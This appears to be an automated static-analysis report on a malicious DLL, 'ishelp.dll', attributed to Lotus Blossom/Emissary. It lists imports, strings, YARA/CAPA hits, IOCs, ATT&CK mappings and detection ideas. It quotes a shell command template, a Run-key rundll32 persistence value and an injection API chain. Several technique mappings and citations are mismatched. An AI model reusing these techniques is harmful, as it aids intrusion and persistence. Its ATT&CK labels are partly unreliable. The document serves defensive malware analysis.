@@ -1,0 +1,1068 @@
+> **RevAI provenance** — commit `unknown` · engine `langgraph` · agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True · generated 2026-08-13 09:51:23 UTC
+
+## 1. Executive Summary
+Based on analysis, the sample 'ishelp.dll' is malicious with a confidence score of 95 (source: llm_judge, row_or_rule: verdict, why: high score and agreement). The family guess is Lotus Blossom (source: llm_judge, row_or_rule: family_guess, why: threat intelligence match from VirusTotal). Key malicious behaviors include process injection via CreateRemoteThread (source: malcat, query_or_table: Top high-signal imports, row_or_rule: kernel32.CreateRemoteThread, why: API for remote thread creation in other processes), privilege escalation using AdjustTokenPrivileges (source: pe_imports, query_or_table: signals, row_or_rule: change_memory_protection, why: enables executable memory for injection), and persistence through registry autorun keys (source: malcat, query_or_table: Strings/registry, row_or_rule: Software\Microsoft\Windows\CurrentVersion\Run, why: autostart persistence). The DLL drops an embedded payload to disk as 'A08E81B411.DAT' and injects into Internet Explorer processes (source: deep_dive_agentic, query_or_table: key_evidence, row_or_rule: string refs, why: IE injection targeting). Multiple engines agree on maliciousness, with YARA rule 'Emissary_APT_Malware_1' matching 8 strings (source: yara, query_or_table: matches, row_or_rule: Emissary_APT_Malware_1, why: APT family signature). Dynamic analysis did not observe runtime behavior, but static indicators strongly support the malicious verdict.
+
+## 2. Sample Metadata
+The sample metadata is as follows: SHA256 hash: bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76 (source: malcat, query_or_table: Malcat File Summary, row_or_rule: sha256, why: file identifier). Sample path: /opt/samples/corpus/malware/bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76/ishelp.dll (source: malcat, query_or_table: Malcat File Summary, row_or_rule: sample_path, why: location in corpus). Project name: malware (source: structured evidence, query_or_table: project_name, why: analysis context). The file is a 32-bit x86 DLL with an entry point at EA 10359, size 78848 bytes, and entropy 6.35 (source: malcat, query_or_table: Malcat File Summary, row_or_rule: entrypoint_ea, why: execution start and file characteristics). Version information claims 'Loader Dynamic Link Library' and copyright 2015, but this is likely misleading (source: deep_dive_agentic, query_or_table: summary, row_or_rule: VersionInfo metadata, why: metadata does not indicate benign intent).
+
+## 3. File Layout & Structural Analysis
+The PE file structure includes the following sections (source: malcat, query_or_table: File Layout, row_or_rule: table rows, why: structural overview):
+| Name | EA | Physical | Virtual | Entropy | Rights |
+|---|---|---|---|---|---|
+| header | 0 | 1024 | 0 | 51 | - |
+| .text | 1024 | 14848 | 16384 | 126 | RX |
+| .rdata | 17408 | 4608 | 8192 | 88 | R |
+| .data | 25600 | 2048 | 4096 | 100 | RW |
+| .rsrc | 29696 | 54272 | 57344 | 125 | R |
+| .reloc | 87040 | 2048 | 4096 | 90 | R |
+The .rsrc section has high entropy of 125, indicating possible embedded data or encryption (source: malcat, query_or_table: File Layout, row_or_rule: .rsrc, why: entropy value suggests packed or encrypted content). This aligns with the EmbeddedProgram anomaly (source: malcat, query_or_table: Anomalies, row_or_rule: EmbeddedProgram, why: embedded payload detection). The entry point is in the .text section, and disassembly at EA 10359 shows the DLL entry calling the Setting export function (source: radare2, query_or_table: Disassembly, row_or_rule: 0x10003477, why: entry point code sequence). Additionally, a carved PE file of size 52736 bytes was extracted, likely the embedded payload (source: malcat, query_or_table: Carved Files, row_or_rule: PE, why: resource extraction).
+
+## 4. Static Code Analysis
+Static analysis reveals multiple suspicious elements. The import table includes key APIs for process injection: CreateRemoteThread, WriteProcessMemory, VirtualAllocEx, OpenProcess (source: pe_imports, query_or_table: imports, row_or_rule: table rows, why: classic DLL injection chain). Additionally, AdjustTokenPrivileges and LookupPrivilegeValueA are present for privilege escalation (source: malcat, query_or_table: Imports, row_or_rule: advapi32.AdjustTokenPrivileges, why: privilege manipulation). High-signal strings include '_MICROSOFT_LOADER_MUTEX_' at EA 18808 (source: malcat, query_or_table: High-Signal Strings, row_or_rule: EA 18808, why: mutex for single-instance enforcement), 'cmd.exe /c %s > %s' at EA 69144 (source: malcat, query_or_table: High-Signal Strings, row_or_rule: EA 69144, why: command execution and output redirection), and 'A08E81B411.DAT' multiple times starting at EA 18516 (source: malcat, query_or_table: Top Strings, row_or_rule: EA 18516, why: payload filename). Malcat anomalies include SpaghettiFunction at EA 11347 (source: malcat, query_or_table: Anomaly Locations, row_or_rule: SpaghettiFunction, why: obfuscation with intra-jumps), and XorInLoop at addresses 1111, 1832, etc. (source: malcat, query_or_table: Anomaly Locations, row_or_rule: XorInLoop, why: string deobfuscation). Decompilation of sub_100019a0 shows process enumeration using CreateToolhelp32Snapshot and comparison of modules to 'A08E81B411.DAT' (source: malcat, query_or_table: Decompilations, row_or_rule: sub_100019a0, why: injection target logic). The function sub_10003853 has a cyclomatic complexity of 151 and 2771 bytes, indicating heavy obfuscation (source: deep_dive_agentic, query_or_table: key_evidence, row_or_rule: FUN_10003853, why: complexity metrics). FLOSS strings include stack strings and decoded strings like 'Kernel32.dll' and 'ReleaseFile Error->LoadLibrary Failed[%d].' (source: floss, query_or_table: FLOSS Strings, row_or_rule: high-signal FLOSS, why: debug and behavior hints).
+
+## 5. Behavioral & Dynamic Analysis
+Dynamic analysis via Speakeasy showed no API calls or key events recorded (source: speakeasy, query_or_table: Dynamic, row_or_rule: not observed, why: no runtime behavior captured). Frida probe is available with hook candidates for APIs like GetProcAddress and AdjustTokenPrivileges, but no runtime data was collected (source: frida_probe, query_or_table: Frida Probe, row_or_rule: hook_candidates, why: no execution observed). Therefore, runtime behavior is not observed, and all analysis is based on static indicators. However, from static evidence, the inferred behavioral chain is: (1) creates mutex '_MICROSOFT_LOADER_MUTEX_' for single-instance enforcement, (2) enables SeDebugPrivilege via AdjustTokenPrivileges for elevated process access, (3) extracts an embedded payload from PE resources to disk as 'A08E81B411.DAT' in a \LocalData\ directory (source: deep_dive_agentic, query_or_table: summary, row_or_rule: behavioral chain, why: derived from strings and imports). (4) Enumerates running processes using CreateToolhelp32Snapshot to locate Internet Explorer (iexplore.exe) as injection target (source: ghidra, query_or_table: Anti Analysis Signals, row_or_rule: FUN_100019a0, why: process discovery). (5) Performs process injection via VirtualAllocEx + WriteProcessMemory + CreateRemoteThread into the target (source: malcat, query_or_table: Imports, row_or_rule: injection APIs, why: injection capability). (6) Establishes registry persistence under Run key with 'rundll32.exe "%s",Setting' (source: deep_dive_agentic, query_or_table: key_evidence, row_or_rule: Export Setting, why: persistence mechanism). (7) Reads proxy configuration from Internet Settings registry keys likely for C2 configuration (source: deep_dive_agentic, query_or_table: key_evidence, row_or_rule: proxy strings, why: credential theft or C2 setup).
+
+## 6. Network Indicators & C2
+Network indicators are limited but present. A custom user agent string is embedded (source: malcat, query_or_table: Malcat YARA / Signatures, row_or_rule: CustomUserAgent, why: network communication signature). The string 'Mozilla/4.0 (com.. Windows NT 5.1)' at EA 67812 (source: malcat, query_or_table: Top Strings, row_or_rule: EA 67812, why: user agent for HTTP requests). Proxy-related strings 'ProxyEnable' and 'ProxyServer' in the context of 'Internet Settings' registry path indicate potential proxy configuration for C2 or credential theft (source: deep_dive_agentic, query_or_table: key_evidence, row_or_rule: proxy strings, why: network configuration access). The string 'cmd.exe /c %s > %s' at EA 69144 suggests command execution that could be used for C2 communication or payload execution (source: malcat, query_or_table: High-Signal Strings, row_or_rule: EA 69144, why: shell command for data transfer). No specific C2 domains or IPs were extracted from strings, but the presence of Base64 encoding and SHA512 constants indicates possible encrypted communication (source: yara, query_or_table: YARA Matches, row_or_rule: SHA512_Constants, why: crypto infrastructure).
+
+## 7. Capabilities Assessment
+Capabilities are assessed via CAPA rules and YARA matches. CAPA rules include inject thread (T1055.003), persist via Run registry key (T1547.001), contain obfuscated stackstrings (T1027.005), and enumerate processes (T1057) (source: capa, query_or_table: capa Capability Rules, row_or_rule: table rows, why: behavioral capabilities). YARA matches include inject_thread, escalate_priv, win_mutex, and Emissary_APT_Malware_1 (source: yara, query_or_table: YARA Matches, row_or_rule: table rows, why: signature detections confirming injection and persistence). The DLL has an embedded PE file as per EmbeddedProgram anomaly (source: malcat, query_or_table: Anomalies, row_or_rule: EmbeddedProgram, why: dropper capability for payload delivery). Additional capabilities from imports: privilege escalation via AdjustTokenPrivileges (source: malcat, query_or_table: Imports, row_or_rule: advapi32.AdjustTokenPrivileges, why: API usage), and file operations like CreateFileA and WriteFile for payload dropping (source: malcat, query_or_table: Imports, row_or_rule: kernel32.CreateFileA, why: file manipulation).
+
+## 8. Indicators of Compromise
+Indicators of compromise include: Mutex '_MICROSOFT_LOADER_MUTEX_' (source: malcat, query_or_table: High-Signal Strings, row_or_rule: EA 18808, why: persistence mechanism). File dropped 'A08E81B411.DAT' in \LocalData\ directory (source: deep_dive_agentic, query_or_table: key_evidence, row_or_rule: string refs, why: payload artifact). Registry key 'Software\Microsoft\Windows\CurrentVersion\Run' with value 'rundll32.exe "%s",Setting' for persistence (source: malcat, query_or_table: Top Strings, row_or_rule: EA 18408, why: autorun entry). Export function 'Setting' (source: malcat, query_or_table: Imports, row_or_rule: Setting, why: DLL export used in rundll32 command). Other strings like 'IE Process is running.' at EA 18772 (source: malcat, query_or_table: Top Strings, row_or_rule: EA 18772, why: behavioral indicator), 'SeDebugPrivilege' at EA 18468 (source: malcat, query_or_table: Top Strings, row_or_rule: EA 18468, why: privilege escalation string), and 'ProxyEnable'/'ProxyServer' (source: deep_dive_agentic, query_or_table: key_evidence, row_or_rule: proxy strings, why: network configuration). User agent string 'Mozilla/4.0 (com.. Windows NT 5.1)' at EA 67812 (source: malcat, query_or_table: Top Strings, row_or_rule: EA 67812, why: network identifier).
+
+## 9. Detection Engineering
+Detection rules can be based on existing signatures and behaviors. YARA rules such as 'Emissary_APT_Malware_1' should be updated for this family and used in endpoint detection (source: yara, query_or_table: YARA Matches, row_or_rule: Emissary_APT_Malware_1, why: existing detection for APT patterns). Sigma rules for registry persistence using Run keys with rundll32.exe commands (source: capa, query_or_table: capa Capability Rules, row_or_rule: persist via Run registry key, why: persistence technique). Monitor for APIs like CreateRemoteThread in non-standard contexts, especially when combined with WriteProcessMemory and VirtualAllocEx (source: pe_imports, query_or_table: signals, row_or_rule: create_remote_thread, why: injection behavior). Additionally, watch for the mutex name '_MICROSOFT_LOADER_MUTEX_' and file 'A08E81B411.DAT' as indicators (source: IOCs above). Network detection should include the user agent string and registry key accesses for Internet Settings (source: strings).
+
+## 10. MITRE ATT&CK Mapping
+Based on evidence, the following MITRE ATT&CK techniques are observed: T1055.003 Process Injection: Thread Execution Hijacking (source: capa, query_or_table: capa Capability Rules, row_or_rule: inject thread, why: injection capability via CreateRemoteThread). T1547.001 Boot or Logon Autostart Execution: Registry Run Keys (source: capa, query_or_table: capa Capability Rules, row_or_rule: persist via Run registry key, why: persistence via autorun). T1057 Process Discovery (source: capa, query_or_table: capa Capability Rules, row_or_rule: enumerate processes, why: process enumeration for targeting). T1027.005 Obfuscated Files or Information: Indirect Command Execution (source: capa, query_or_table: capa Capability Rules, row_or_rule: contain obfuscated stackstrings, why: obfuscation techniques). T1112 Modify Registry (source: capa, query_or_table: capa Capability Rules, row_or_rule: delete registry value, why: registry manipulation for persistence or cleanup). Additionally, privilege escalation via SeDebugPrivilege maps to T1548.002 Abuse Elevation Control Mechanism (source: deep_dive_agentic, query_or_table: key_evidence, row_or_rule: imports, why: AdjustTokenPrivileges usage). File discovery T1083 is also indicated (source: capa, query_or_table: capa Capability Rules, row_or_rule: get common file path, why: directory traversal).
+
+## 11. What We Don't Know
+Despite extensive static analysis, several aspects remain unknown. Runtime behavior was not observed due to lack of dynamic execution in Speakeasy or Frida (source: speakeasy, query_or_table: Dynamic, row_or_rule: not observed, why: no runtime data captured). The exact C2 communication protocol, exfiltration methods, and data theft mechanisms are not identified (source: deep_dive_agentic, query_or_table: summary, row_or_rule: exfiltration, why: not observed in analysis). The full capabilities of the embedded payload 'A08E81B411.DAT' are unclear without extracting and analyzing it further (source: malcat, query_or_table: Carved Files, row_or_rule: PE, why: embedded file not fully dissected). Additionally, the malware's evasion techniques beyond obfuscation, such as anti-debugging or anti-VM, are not fully characterized (source: capa, query_or_table: capa Capability Rules, row_or_rule: obfuscated stackstrings, why: known evasion but other methods may exist). The network exfiltration path and specific C2 endpoints remain speculative (source: strings).
+
+## 12. Appendix A: Tool Evidence Trail
+Tools used in analysis include Malcat for file analysis, anomalies, and imports (source: malcat, evidence cited throughout). CAPA for capability detection with 30 rules matched (source: capa, query_or_table: capa Capability Rules). YARA for signature matching with 26 rules including 'Emissary_APT_Malware_1' (source: yara, query_or_table: YARA Matches). FLOSS for string extraction with 619 strings (source: floss, query_or_table: FLOSS Strings). Radare2 for disassembly of key functions (source: radare2, query_or_table: Disassembly). Ghidra and IDA agreed on 74 functions and 88 imports (source: ghidra, query_or_table: Anti Analysis Signals). Speakeasy and Frida were used but no runtime behavior was recorded (source: speakeasy and frida_probe). Evidence trails are cited in each section with specific sources and addresses.
+
+## 13. Appendix B: Analysis Environment
+The analysis was conducted in a controlled environment using the tools mentioned. The sample was analyzed statically with disassemblers like Ghidra, IDA, and radare2, and dynamically with emulators like Speakeasy, but no live network or system interactions were recorded (source: deep-dive.json, query_or_table: tool_gate, why: environment setup). The environment includes a PE analysis pipeline with tools for unpacking, string extraction, and behavioral simulation, though UPX unpacking was not applicable (source: upx_unpack, query_or_table: UPX Unpack, row_or_rule: upx_ok: False, why: not packed with UPX). All evidence was gathered from JSON outputs of automated tools, ensuring reproducibility.
+## Appendix: Full Structured Evidence Pack
+
+# Technical Evidence Pack
+
+**sha256:** bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76  
+**sample_path:** /opt/samples/corpus/malware/bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76/ishelp.dll  
+**project_name:** malware
+
+> Every table below is copied from stage JSON. Technical narrative must cite these rows (engine + address/rule), not invent evidence.
+
+## Verdict
+- **verdict**: malicious
+- **score**: 95
+- **family_guess**: Lotus Blossom
+- **agreement**: llm_and_v1_agree
+- **cross_engine_notes**: Ghidra and IDA agree on 74 functions and 88 imports, indicating reliable disassembly. MalCat identifies 11 anomalies including EmbeddedProgram and high-signal imports like CreateRemoteThread. Capa and YARA rules detect process injection, privilege escalation, and persistence behaviors. External VirusTotal shows 49 malicious detections with threat names like 'lotusblossom' and 'explorerhijack'.
+- **summary**: The DLL 'ishelp.dll' exhibits malicious behavior including process injection via CreateRemoteThread, registry-based persistence, privilege escalation, and an embedded payload. It uses anti-analysis techniques and matches known malware patterns, with strong consensus from multiple analysis engines and external threat intelligence.
+- **source**: llm_judge
+- **model**: mimo-v2.5-pro
+
+### key_evidence (triage) — cite source field exactly
+| source | query_or_table | row_or_rule | why |
+|---|---|---|---|
+| malcat | Top high-signal imports | `kernel32.CreateRemoteThread` | API for creating remote threads in other processes, a key technique for process injection and malicious code execution. |
+| capa | ATT&CK | `T1055.003` | Rule for Thread Execution Hijacking, indicating process injection for defense evasion, a clear malicious behavior. |
+| ghidra | Anti Analysis Signals | `FUN_100019a0` | Function enumerates processes using CreateToolhelp32Snapshot, used for discovery and targeting in malicious activities. |
+| yara | matches | `inject_thread` | YARA rule match for thread injection, confirming malicious injection capabilities from behavioral patterns. |
+| malcat | Anomalies | `EmbeddedProgram` | Anomaly indicates an embedded program, suggesting dropper or payload delivery functionality for malware distribution. |
+| malcat | Strings/registry | `Software\Microsoft\Windows\CurrentVersion\Run` | Registry key for autostart persistence, commonly modified by malware to ensure survival across reboots. |
+| ghidra | Suspicious strings (Ghidra) | `cmd.exe /c %s > %s` | String for command execution and output redirection, indicating potential command-and-control or payload execution. |
+| pe_imports | signals | `change_memory_protection` | VirtualProtect API used to alter memory permissions, enabling executable code in non-executable regions for injection. |
+
+## Deep-Dive Summary Evidence
+- **source**: deep_dive_agentic
+- **confidence**: 98
+- **summary**: This is a DLL dropper/loader component of the Emissary APT malware family. YARA rule 'Emissary_APT_Malware_1' matched with 8 distinct strings. The DLL exports a 'Setting' function designed to be invoked via rundll32.exe. Its behavioral chain: (1) creates mutex '_MICROSOFT_LOADER_MUTEX_' for single-instance enforcement, (2) enables SeDebugPrivilege via AdjustTokenPrivileges for elevated process access, (3) extracts an embedded payload from PE resources to disk as 'A08E81B411.DAT' in a \LocalData\ directory (FindResourceW/LockResource/CreateFileA), (4) enumerates running processes using CreateToolhelp32Snapshot to locate IE (iexplore.exe) as injection target, (5) performs classic process injection via VirtualAllocEx + WriteProcessMemory + CreateRemoteThread into the target process, (6) establishes registry persistence under Software\Microsoft\Windows\CurrentVersion\Run with 'rundll32.exe "%s",Setting', (7) reads proxy configuration from Internet Settings registry keys (ProxyEnable/ProxyServer) likely for C2 configuration. CAPA confirms stack string obfuscation (T1027.005), Base64 encoding (T1027), and file discovery (T1083). The 151-cyclomatic-complexity main function (FUN_10003853, 2771 bytes) suggests heavy obfuscation or control-flow flattening. VersionInfo metadata claiming 'Loader Dynamic Link Library' and 'Copyright (C) 2015' is irrelevant — all functional indicators are unambiguously malicious. Exfiltration: Not observed based on YARA rule 'Emissary_APT_Malware_1' and CAPA analysis, as no data exfiltration techniques (e.g., network transmission, file transfer) were identified in the behavioral chain or tool outputs. Defense impairment: Not observed based on YARA rule 'Emissary_APT_Malware_1' and CAPA analysis, as no techniques to disable security tools, clear logs, or evade defenses were identified in the behavioral chain or tool outputs.
+
+### deep key_evidence
+- `"YARA rule 'Emissary_APT_Malware_1' matched with 8 strings at offsets 61976, 61996, 17696, 61864, 60320, 61412, 70960, 61896"`
+- `"Imports: CreateRemoteThread, WriteProcessMemory, VirtualAllocEx, VirtualProtectEx, OpenProcess (classic DLL injection chain)"`
+- `"Imports: AdjustTokenPrivileges, LookupPrivilegeValueA, OpenProcessToken (privilege escalation)"`
+- `"String refs in FUN_10002300: 'IE Process is running.' and '_MICROSOFT_LOADER_MUTEX_' (IE injection targeting + mutex)"`
+- `"String refs in FUN_100019a0: 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'A08E81B411.DAT', 'SeDebugPrivilege', '\\LocalData\\' (persistence + payload drop + priv esc)"`
+- `"Export 'Setting' with string 'rundll32.exe \"%s\",Setting' (autorun persistence via rundll32)"`
+- `"Strings: 'ProxyEnable', 'ProxyServer', 'Internet Settings' registry path (proxy credential theft)"`
+- `"FUN_10001820 references 'ReleaseFile Error->FindResource Failed', 'LoadLibrary Failed', 'GetProcAddress Failed', 'CreateFile Failed' (resource-based dropper with debug strings)"`
+- `"CAPA: obfuscated stackstrings (T1027.005), Base64 encoding (T1027), file/directory discovery (T1083)"`
+- `"FUN_10003853: size=2771, cyclomatic_complexity=151, 240 basic blocks (heavily obfuscated main payload logic)"`
+- `"Imports: CreateToolhelp32Snapshot, Process32First, Process32Next, Module32First, Module32Next (process/module enumeration for injection target)"`
+- `"SHA512 constants and BASE64 alphabet table detected at offsets 58812-58836 and 58736 (crypto encoding infrastructure)"`
+
+## Malcat Structured Analysis
+### Malcat File Summary
+```
+sha256: bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76
+size: 78848
+type: PE
+architecture: X86
+entrypoint_ea: 10359
+entropy: 6.35
+file_name: ishelp.dll
+```
+
+### File Layout (sections/regions)
+| Name | EA | Physical | Virtual | Entropy | Rights |
+|---|---|---|---|---|---|
+| header | 0 | 1024 | 0 | 51 | - |
+| .text | 1024 | 14848 | 16384 | 126 | RX |
+| .rdata | 17408 | 4608 | 8192 | 88 | R |
+| .data | 25600 | 2048 | 4096 | 100 | RW |
+| .rsrc | 29696 | 54272 | 57344 | 125 | R |
+| .reloc | 87040 | 2048 | 4096 | 90 | R |
+
+### Malcat YARA / Signatures (8)
+| Rule | Category | Type | Reliability | Description |
+|---|---|---|---|---|
+| MSVC_2008_linker | compiler | INFO | 60 | detects used visual studio version based on linker information |
+| MSVC_2008_rich | compiler | INFO | 80 | detects used visual studio version based on rich header information |
+| CustomUserAgent | network | UNCOMMON | 30 | embeds a user agent string |
+| EnumerateProcesses | fingerprint | UNCOMMON | 60 | Enumerate running processes, a technique sometimes used by packers to avoid spec |
+| AutorunKey | persistence | UNCOMMON | 20 | file contains path of an autorun key |
+| ChangeBrowserPreference | tampering | SUSPICIOUS | 40 | may change browser preference, often used by adware |
+| ElevatePrivileges | lateral movement | UNCOMMON | 70 | elevate privileges using Windows API |
+| RunShell | lateral movement | UNCOMMON | 70 | starts a shell |
+
+### Anomalies (11)
+| Name | Level | Category | Hits | Description |
+|---|---|---|---|---|
+| HugeStringBinary | 4 | strings | 1 | string has more than 1024 characters and binary encoding |
+| InvalidChecksum | 4 | integrity | 1 | PE Header checksum is wrong |
+| PossiblePackerApiDynamicImport | 4 | imports | 1 | A packer-related api (VirtualProtect, ResumeThread, etc.) is present as string in the binary, but is |
+| BigStringHiScore | 3 | strings | 1 | string has more than 256 characters and high interest score |
+| DynamicString | 3 | strings | 1 | string is constructed dynamically |
+| EmbeddedProgram | 3 | embedding | 1 | File embeds a program |
+| ManyUniqueImmediateBytes | 3 | code | 1 | More than 48 unique bytes defined across all immediate operands in the function |
+| StackArrayInitialisationX86 | 3 | code | 2 | An array of data is dynamically built on the stack, sometimes used to build shellcodes or strings |
+| StringBase64 | 3 | strings | 1 | string has more than 16 characters is encoded using base64 |
+| XorInLoop | 3 | code | 5 | XOR instruction in a loop |
+| SpaghettiFunction | 1 | code | 1 | Function with lots of intra jumps, could be obfuscated |
+
+### Anomaly Locations (high-signal)
+- **DynamicString**
+  - `3735`: 
+- **ManyUniqueImmediateBytes**
+  - `11347`: 
+- **SpaghettiFunction**
+  - `11347`: 
+- **XorInLoop**
+  - `1111`: 
+  - `1832`: 
+  - `2260`: 
+  - `2639`: 
+  - `8574`: 
+
+### High-Signal Strings (11 matched keywords; engine=malcat)
+| EA | String |
+|---|---|
+| 18672 | `kernel32.dll` |
+| 18500 | `kernel32.dll` |
+| 18200 | `Kernel32.dll` |
+| 18808 | `_MICROSOFT_LOADER_MUTEX_` |
+| 69144 | `cmd.exe /c %s > %s` |
+| 18688 | `LoadLibraryA` |
+| 21508 | `KERNEL32.dll` |
+| 69108 | `kernel32.dll` |
+| 75634 | `KERNEL32.dll` |
+| 68580 | `UploadFile - EncryptBuffer Error` |
+| 75120 | `GetProcAddress` |
+
+### Top Strings (300 extracted; showing 80)
+| EA | String |
+|---|---|
+| 18408 | `Software\Microso..rrentVersion\Run` |
+| 3735 | `2801000000000000..0000000000000000` |
+| 18468 | `SeDebugPrivilege` |
+| 19384 | `Software\Microso..nternet Settings` |
+| 19260 | `Software\Microso..rrentVersion\Run` |
+| 67252 | `Software\Microso..rrentVersion\Run` |
+| 67812 | `Mozilla/4.0 (com.. Windows NT 5.1)` |
+| 18516 | `A08E81B411.DAT` |
+| 18724 | `A08E81B411.DAT` |
+| 18596 | `A08E81B411.DAT` |
+| 18580 | `A08E81B411.DAT` |
+| 18564 | `A08E81B411.DAT` |
+| 18548 | `A08E81B411.DAT` |
+| 18532 | `A08E81B411.DAT` |
+| 18672 | `kernel32.dll` |
+| 18500 | `kernel32.dll` |
+| 18096 | `asdasdasdasdsad` |
+| 18200 | `Kernel32.dll` |
+| 17808 | `Invalid paramete..ntime function.
+` |
+| 18740 | `ishelp.dll` |
+| 20608 | `CreateToolhelp32Snapshot` |
+| 18128 | `ReleaseFile Erro..urce Failed[%d].` |
+| 19168 | `75BD50EC.DAT` |
+| 18216 | `ReleaseFile Erro..rary Failed[%d].` |
+| 18348 | `ReleaseFile->Cre..File Failed[%d].` |
+| 18276 | `ReleaseFile->Get..ress Failed[%d].` |
+| 18316 | `ReleaseFile->ProLdRsc Failed.` |
+| 83404 | `<assembly xmlns=..XPADDINGPADDINGX` |
+| 18808 | `_MICROSOFT_LOADER_MUTEX_` |
+| 21616 | `AdjustTokenPrivileges` |
+| 20856 | `Process32Next` |
+| 18172 | `ReleaseFile Error->Size=0.` |
+| 69144 | `cmd.exe /c %s > %s` |
+| 18772 | `IE Process is running.` |
+| 17988 | `%d/%02d/%02d %02d:%02d:%02d - ` |
+| 20888 | `Module32Next` |
+| 18396 | `\LocalData\` |
+| 18712 | `\LocalData\` |
+| 18688 | `LoadLibraryA` |
+| 18488 | `FreeLibrary` |
+| 19184 | `\LocalData\` |
+| 18384 | `Removing...` |
+| 18260 | `LoadResource` |
+| 18456 | `SystemDrive` |
+| 18704 | `Rew.
+` |
+| 21706 | `ole32.dll` |
+| 21638 | `ADVAPI32.dll` |
+| 21508 | `KERNEL32.dll` |
+| 21678 | `SHELL32.dll` |
+| 21750 | `RPCRT4.dll` |
+| 21826 | `Loader.dll` |
+| 18796 | `ReF(D)F.` |
+| 17872 | `(null)` |
+| 20300 | `msvcrt.dll` |
+| 65904 | `ABCDEFGHIJKLMNOP..wxyz0123456789+/` |
+| 17888 | `(null)` |
+| 18992 | `ntdll.dll` |
+| 21837 | `Setting` |
+| 76968 | `0123456789ABCDEF` |
+| 78128 | `WinDLL.dll` |
+| 83164 | `Loader.dll` |
+| 77864 | `DLL Dynamic Link Library` |
+| 67892 | `<input id="check..heck_ip" value="` |
+| 82888 | `Loader Dynamic Link Library` |
+| 78184 | `DLL Dynamic Link Library` |
+| 19032 | `XXXX.dat` |
+| 83220 | `Loader Dynamic Link Library` |
+| 29930 | `ASDASDASDASDSAD` |
+| 69108 | `kernel32.dll` |
+| 77678 | `VS_VERSION_INFO` |
+| 18024 | `%d/%02d/%02d %02d:%02d:%02d - ` |
+| 82702 | `VS_VERSION_INFO` |
+| 67392 | `Global\{7BDACDEE..46-D00FCFF1FFBA}` |
+| 83130 | `OriginalFilename` |
+| 78094 | `OriginalFilename` |
+| 77806 | `040904b0` |
+| 65716 | `Invalid paramete..ntime function.
+` |
+| 82830 | `040904b0` |
+| 67488 | `CDllApp::InitIns..eate successful.` |
+| 68868 | `DownloadFile Err..Data From Server` |
+
+### Constants / Known Patterns (6)
+| Category | Value |
+|---|---|
+| registry | `registry::HKEY_CURRENT_USER` |
+| exception | `exception::C++ exception` |
+| registry | `registry::autorun` |
+| crypto | `crypto::Base64` |
+| hash | `hash::Hash_constant_words_K_for_SHA_384_and_SHA_512__64_lil_640` |
+| crypto | `crypto::ASCII_to_BIN_table__8_byt_128` |
+
+### Imports (113)
+| EA | Name | Type | Refs |
+|---|---|---|---|
+| 6752 | Setting | EXPORT | 1 |
+| 7664 | @__security_check_cookie@4 | DEBUG | 13 |
+| 7995 | _strcat_s | DEBUG | 8 |
+| 8111 | _strcpy_s | DEBUG | 3 |
+| 8215 | _strncpy_s | DEBUG | 2 |
+| 8396 | _wcscat_s | DEBUG | 1 |
+| 8668 | SEH.0 | DEBUG | 2 |
+| 8766 | @_EH4_CallFilterFunc@8 | DEBUG | 1 |
+| 8789 | @_EH4_TransferToHandler@8 | DEBUG | 1 |
+| 8840 | @_EH4_LocalUnwind@16 | DEBUG | 2 |
+| 8864 | __except_handler4_common | DEBUG | 1 |
+| 9262 | ___CppXcptFilter | DEBUG | 8 |
+| 9294 | __initterm_e | DEBUG | 1 |
+| 10359 | _DllEntryPoint@12 | DEBUG | 1 |
+| 10381 | ___report_gsfailure | DEBUG | 1 |
+| 10608 | __aulldvrm | DEBUG | 1 |
+| 10770 | _write_char | DEBUG | 5 |
+| 10821 | _write_multi_char | DEBUG | 3 |
+| 14384 | __ValidateImageBase | DEBUG | 1 |
+| 14448 | __FindPESection | DEBUG | 1 |
+| 14644 | __SEH_prolog4 | DEBUG | 2 |
+| 14733 | SEH.1 | DEBUG | 2 |
+| 14733 | __except_handler4 | DEBUG | 2 |
+| 14928 | __allmul | DEBUG | 0 |
+| 15392 | __alloca_probe | DEBUG | 1 |
+| 17408 | advapi32.OpenProcessToken | IMPORT | 7 |
+| 17412 | advapi32.RegCloseKey | IMPORT | 1 |
+| 17416 | advapi32.AdjustTokenPrivileges | IMPORT | 1 |
+| 17420 | advapi32.LookupPrivilegeValueA | IMPORT | 1 |
+| 17424 | advapi32.RegOpenKeyExA | IMPORT | 1 |
+| 17428 | advapi32.RegDeleteValueA | IMPORT | 1 |
+| 17436 | kernel32.GetProcAddress | IMPORT | 4 |
+| 17440 | kernel32.GetSystemTimeAsFileTime | IMPORT | 1 |
+| 17444 | kernel32.GetCurrentProcessId | IMPORT | 1 |
+| 17448 | kernel32.GetCurrentThreadId | IMPORT | 1 |
+| 17452 | kernel32.GetTickCount | IMPORT | 1 |
+| 17456 | kernel32.QueryPerformanceCounter | IMPORT | 1 |
+| 17460 | kernel32.SetUnhandledExceptionFilter | IMPORT | 1 |
+| 17464 | kernel32.UnhandledExceptionFilter | IMPORT | 1 |
+| 17468 | kernel32.TerminateProcess | IMPORT | 1 |
+| 17472 | kernel32.InterlockedCompareExchange | IMPORT | 2 |
+| 17476 | kernel32.InterlockedExchange | IMPORT | 2 |
+| 17480 | kernel32.RtlUnwind | IMPORT | 1 |
+| 17484 | kernel32.SetEndOfFile | IMPORT | 1 |
+| 17488 | kernel32.GetFileSize | IMPORT | 1 |
+| 17492 | kernel32.GetLocalTime | IMPORT | 1 |
+| 17496 | kernel32.WideCharToMultiByte | IMPORT | 1 |
+| 17500 | kernel32.CreateMutexA | IMPORT | 1 |
+| 17504 | kernel32.CopyFileA | IMPORT | 1 |
+| 17508 | kernel32.GetTempPathW | IMPORT | 1 |
+| 17512 | kernel32.GetModuleFileNameA | IMPORT | 1 |
+| 17516 | kernel32.OutputDebugStringA | IMPORT | 3 |
+| 17520 | kernel32.GetExitCodeThread | IMPORT | 1 |
+| 17524 | kernel32.CreateProcessA | IMPORT | 1 |
+| 17528 | kernel32.DeleteFileA | IMPORT | 3 |
+| 17532 | kernel32.WaitForSingleObject | IMPORT | 2 |
